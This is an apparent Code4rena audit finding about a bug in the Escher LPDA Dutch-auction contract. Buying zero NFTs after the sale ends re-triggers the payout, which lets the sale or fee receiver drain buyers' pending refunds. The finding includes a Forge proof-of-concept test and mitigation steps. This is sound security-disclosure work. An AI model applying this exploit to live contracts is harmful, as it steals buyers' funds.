[H-03]saleReceiverandfeeReceivercan steal refunds after sale has ended
Submitted byimmeas, also found byAkshaySrivastav,cryptonue,saian,minhquanym,0xDecorativePineapple,gzeon,ey88,wait,pauliax,HollaDieWaldfee,jayphbee,bin2chen,evan,reassor,fs0c,hihen,hansfriese,0x52, andaviggiano
https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L67-L68
https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L81-L88
First, lets go over how a buy happens.
A buyer can buy NFTs at a higher price and then once the auction ends they can userefund()to return the over payments. The effect is that they bought the NFTs at the lowest price (Lowest Price Dutch Auction).
Now, let’s move on to what happens when the sale ends:
The sale is considered ended when the last NFT is sold which triggers the payout to the seller and fee collector:
81:if(newId==temp.finalId) {82:sale.finalPrice=uint80(price);83:uint256totalSale=price*amountSold;84:uint256fee=totalSale/20;85:ISaleFactory(factory).feeReceiver().transfer(fee);86:temp.saleReceiver.transfer(totalSale-fee);87:_end();88:        }
Earlier there’s also a check that you cannot continue buying once thecurrentIdhas reachedfinalId:
67:uint48newId=amount+temp.currentId;68:require(newId<=temp.finalId,"TOO MANY");
However, it is still possible to buy0NFTs for whichever price you want even after the sale has ended. Triggering the “end of sale” snippet again, sincenewIdwill still equaltemp.finalId.
The attacker,saleReceiver(orfeeReceiver), buys0NFTs for the delta betweentotalSaleand the balance still in the contract (the over payments by buyers). If there is more balance in the contract thantotalSalesthis can be iterated until the contract is empty.
The attacker has then stolen the over payments from the buyers.
A buyer can mitigate this by continuously callingrefund()as the price lowers but that would incur a high gas cost.
Impact
saleReceiverorfeeReceivercan steal buyers over payments after the sale has ended. Who gains the most depends on circumstances in the auction.
Proof of Concept
PoC test intest/LPDA.t.sol:
functiontest_BuyStealRefund()public{sale=LPDA(lpdaSales.createLPDASale(lpdaSale));edition.grantRole(edition.MINTER_ROLE(),address(sale));// buy most nfts at a higher pricesale.buy{value:9ether}(9);// warp to when price is lowestvm.warp(block.timestamp+1days);uint256price=sale.getPrice();// 0.9 eth// buy last nft at lowest possible pricesale.buy{value:price}(1);uint256contractBalanceAfterEnd=address(sale).balance;uint256receiverBalanceAfterEnd=address(69).balance;console.log("Sale end");console.log("LPDA contract",contractBalanceAfterEnd);// ~ 0.9 ethconsole.log("saleReceiver ",receiverBalanceAfterEnd);// ~9 - fee eth// buy 0 nfts for the totalSales price - current balance// totalSales: 9 eth - contract balance 0.9 eth = ~8.1 ethuint256totalSale=price*10;uint256delta=totalSale-contractBalanceAfterEnd;sale.buy{value:delta}(0);console.log("after steal");console.log("LPDA contract",address(sale).balance);console.log("saleReceiver ",address(69).balance-receiverBalanceAfterEnd-delta);// ~0.45 eth stolen by receiver, 0.45 eth to fees// buyer supposed to get back the ~0.9 ethvm.expectRevert();// EvmError: OutOfFundsale.refund();// nothing to refund}
Tools Used
VS Code, Forge
Recommended Mitigation Steps
I can think of different options of how to mitigate this:
Don’t allow buying 0 NFTsDon’t allow buying ifnewId == finalIdsince the sale has ended
mehtaculous (Escher) disagreed with severity